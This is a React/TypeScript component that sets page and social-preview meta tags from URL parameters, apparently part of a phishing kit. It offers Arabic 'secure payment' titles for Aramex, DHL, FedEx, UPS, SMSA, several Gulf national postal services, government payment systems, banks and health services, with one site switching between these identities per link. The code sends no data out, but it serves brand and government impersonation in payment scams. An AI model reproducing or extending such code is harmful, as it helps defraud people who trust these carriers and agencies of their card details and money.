import { useEffect } from 'react';
import { useLocation } from 'react-router-dom';
import { isGovernmentService, getGovernmentServiceMeta } from '@/lib/governmentPaymentServices';
import { getCountryByCurrency } from '@/lib/countryCurrencies';

const companyMeta: Record<string, { title: string; description: string; image: string }> = {
  aramex: {
    title: "دفع آمن - أرامكس للشحن السريع 🚚",
    description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة في جميع أنحاء الخليج والعالم ✅",
    image: "/og-aramex.jpg"
  },
  dhl: {
    title: "دفع آمن - DHL الشحن العالمي السريع ⚡",
    description: "DHL - الشبكة العالمية الأكبر للشحن السريع - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة وموثوقة إلى أي مكان في العالم 🌍",
    image: "/og-dhl.jpg"
  },
  fedex: {
    title: "دفع آمن - FedEx الشحن الدولي الموثوق 📦",
    description: "FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول في الموعد المحدد ⏰",
    image: "/og-fedex.jpg"
  },
  ups: {
    title: "دفع آمن - UPS للشحن والتوصيل العالمي 🌐",
    description: "UPS - حلول لوجستية متكاملة - أكمل الدفع بأمان للحصول على خدمات شحن عالمية احترافية مع تغطية شاملة وتتبع دقيق 📍",
    image: "/og-ups.jpg"
  },
  smsa: {
    title: "دفع آمن - SMSA Express سمسا إكسبرس 🚛",
    description: "SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة في جميع أنحاء المملكة 🇸🇦",
    image: "/og-smsa.jpg"
  },
  naqel: {
    title: "دفع آمن - ناقل إكسبريس للشحن 🚚",
    description: "ناقل إكسبريس - خدمات شحن متطورة - أكمل دفعتك بأمان للحصول على توصيل سريع وآمن لجميع مدن ومناطق المملكة ⚡",
    image: "/og-naqel.jpg"
  },
  zajil: {
    title: "دفع آمن - زاجل للشحن السريع 📮",
    description: "زاجل - شحن سريع وموثوق في السعودية - ادفع بأمان واحصل على خدمات توصيل احترافية مع تغطية شاملة لكل المناطق 🇸🇦",
    image: "/og-zajil.jpg"
  },
  saudipost: {
    title: "دفع آمن - البريد السعودي 🇸🇦",
    description: "البريد السعودي الرسمي - خدمات بريدية وشحن موثوقة - ادفع بأمان واستفد من شبكة التوزيع الأوسع في المملكة 📦",
    image: "/og-saudipost.jpg"
  },
  empost: {
    title: "دفع آمن - البريد الإماراتي 🇦🇪",
    description: "البريد الإماراتي الرسمي - خدمات بريدية وشحن متميزة - ادفع بأمان واستمتع بخدمات الشحن المحلية والدولية الموثوقة ✨",
    image: "/og-empost.jpg"
  },
  qpost: {
    title: "دفع آمن - البريد القطري 🇶🇦",
    description: "البريد القطري الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واستمتع بخدمات توصيل سريعة وآمنة في قطر والعالم 🌍",
    image: "/og-qpost.jpg"
  },
  kwpost: {
    title: "دفع آمن - البريد الكويتي 🇰🇼",
    description: "البريد الكويتي الرسمي - خدمات بريدية وشحن متميزة - أكمل الدفع بأمان للحصول على خدمات توصيل محلية ودولية موثوقة ✅",
    image: "/og-kwpost.jpg"
  },
  omanpost: {
    title: "دفع آمن - البريد العُماني 🇴🇲",
    description: "البريد العُماني الرسمي - خدمات بريدية وشحن موثوقة - أكمل دفعتك بأمان للحصول على خدمات توصيل محلية ودولية متميزة 📮",
    image: "/og-omanpost.jpg"
  },
  bahpost: {
    title: "دفع آمن - البريد البحريني 🇧🇭",
    description: "البريد البحريني الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واحصل على خدمات توصيل سريعة وموثوقة في البحرين والعالم ✨",
    image: "/og-bahpost.jpg"
  },
  chalets: {
    title: "دفع آمن - حجز الشاليهات والاستراحات 🏖️",
    description: "حجز شاليهات فاخرة واستراحات مريحة - ادفع بأمان واحجز إقامتك المثالية مع عروض حصرية وخدمات متميزة في جميع أنحاء الخليج 🌟",
    image: "/og-chalets.jpg"
  },
  contracts: {
    title: "دفع آمن - العقود والاتفاقيات القانونية 📄",
    description: "تسديد العقود والاتفاقيات - أكمل دفعتك بأمان للعقود العقارية والتجارية والخدمية مع حماية قانونية كاملة وموثقة ✅",
    image: "/og-contracts.jpg"
  },
  invoices: {
    title: "دفع آمن - الفواتير والمستحقات 📋",
    description: "دفع الفواتير إلكترونياً - سدد فواتيرك ومستحقاتك بكل سهولة وأمان مع تأكيد فوري ومتابعة دقيقة لجميع معاملاتك المالية 💰",
    image: "/og-invoices.jpg"
  },
  government_payment: {
    title: "سداد الخدمات الحكومية - دفع آمن ومضمون 🏛️",
    description: "بوابة الدفع الإلكتروني للخدمات والرسوم الحكومية - سدد رسومك الحكومية بأمان تام عبر سداد، بنفت، كي نت، جيوان ومال | أنظمة الدفع الحكومية المعتمدة في دول الخليج 🇸🇦🇦🇪🇰🇼🇧🇭🇴🇲🇶🇦",
    image: "/og-government_payment.jpg"
  },
  health_links: {
    title: "دفع آمن - الخدمات الصحية والطبية 🏥",
    description: "دفع الخدمات الصحية والطبية - سدد فواتيرك الطبية، التأمين الصحي، والمستشفيات بأمان مع تأكيد فوري وخصوصية تامة 🩺",
    image: "/og-health_links.jpg"
  },
  local_payment: {
    title: "دفع آمن - المدفوعات المحلية 💳",
    description: "خدمات الدفع المحلي السريع - سدد مدفوعاتك المحلية بسهولة وأمان مع دعم جميع وسائل الدفع المحلية المعتمدة في دول الخليج 🌍",
    image: "/og-local_payment.jpg"
  },
  bank_pages: {
    title: "دفع آمن - البنوك الخليجية 🏦",
    description: "الدفع عبر البنوك الخليجية - اختر بنكك المفضل من أكثر من 50 بنك خليجي وأكمل معاملتك المالية بأمان وسرعة فائقة 💎",
    image: "/og-bank_pages.jpg"
  },
  default: {
    title: "منصة الدفع الذكية - خدمات دفع آمنة لدول الخليج 💳",
    description: "منصة متكاملة لخدمات الدفع الإلكتروني في دول الخليج - شحن، فواتير، عقود، خدمات حكومية وصحية بأمان وسهولة تامة",
    image: "/og-aramex.jpg"
  }
};

interface ClientMetaTagsProps {
  serviceKey?: string;
}

const ClientMetaTags = ({ serviceKey }: ClientMetaTagsProps) => {
  const location = useLocation();

  useEffect(() => {
    const urlParams = new URLSearchParams(location.search);
    const companyParam = urlParams.get('company') || urlParams.get('service') || serviceKey || 'default';
    const countryParam = urlParams.get('country') || urlParams.get('c');
    const currencyParam = urlParams.get('currency');
    
    // Check if government service and get appropriate meta
    const isGovService = isGovernmentService(companyParam);
    let meta;
    
    if (isGovService) {
      // Get country from URL params or infer from currency
      const inferredCountry = currencyParam ? getCountryByCurrency(currencyParam) : null;
      const finalCountry = countryParam || inferredCountry || 'SA';
      const govMeta = getGovernmentServiceMeta(finalCountry);
      meta = { title: govMeta.title, description: govMeta.description, image: govMeta.image };
    } else {
      meta = companyMeta[companyParam.toLowerCase()] || companyMeta.default;
    }
    
    const origin = window.location.origin;
    const fullImageUrl = `${origin}${meta.image}`;
    const fullUrl = window.location.href;

    document.title = meta.title;
    
    const updateMetaTag = (selector: string, content: string) => {
      let metaTag = document.querySelector(selector);
      if (metaTag) {
        metaTag.setAttribute('content', content);
      }
    };

    updateMetaTag('meta[name="description"]', meta.description);
    updateMetaTag('meta[property="og:title"]', meta.title);
    updateMetaTag('meta[property="og:description"]', meta.description);
    updateMetaTag('meta[property="og:image"]', fullImageUrl);
    updateMetaTag('meta[property="og:url"]', fullUrl);
    updateMetaTag('meta[property="og:image:secure_url"]', fullImageUrl);
    updateMetaTag('meta[name="twitter:title"]', meta.title);
    updateMetaTag('meta[name="twitter:description"]', meta.description);
    updateMetaTag('meta[name="twitter:image"]', fullImageUrl);
    updateMetaTag('meta[name="twitter:image:alt"]', meta.title);
    updateMetaTag('meta[property="og:image:alt"]', meta.title);

    console.log(`[Client Meta] Updated for ${companyParam}:`, meta.title);
  }, [location.search, serviceKey]);

  return null;
};

export default ClientMetaTags;
